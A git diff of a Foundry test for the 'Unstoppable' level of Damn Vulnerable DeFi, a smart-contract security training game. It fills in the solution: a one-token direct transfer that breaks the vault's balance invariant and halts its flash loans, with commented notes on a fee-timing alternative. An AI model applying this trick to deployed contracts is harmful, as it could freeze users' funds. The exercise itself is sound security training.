@@ -32,7 +32,11 @@ contract UnstoppableChallenge is Test {
         startHoax(deployer);
         // Deploy token and vault
         token = new DamnValuableToken();
-        vault = new UnstoppableVault({_token: token, _owner: deployer, _feeRecipient: deployer});
+        vault = new UnstoppableVault({
+            _token: token,
+            _owner: deployer,
+            _feeRecipient: deployer
+        });
 
         // Deposit tokens to vault
         token.approve(address(vault), TOKENS_IN_VAULT);
@@ -91,7 +95,12 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        // TODO: Implement a way to make the vault pause and transfer ownership to the deployer
+        // vm.warp(block.timestamp + 31 days);
+        // // revert UnexpectedFlashLoan() will be triggered because of the fee condition < fee != 0 >
+        // // and after the grace period of 30 days fee is required
+
+        token.transfer(address(vault), 1); // the condition - if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();
     }
 
     /**
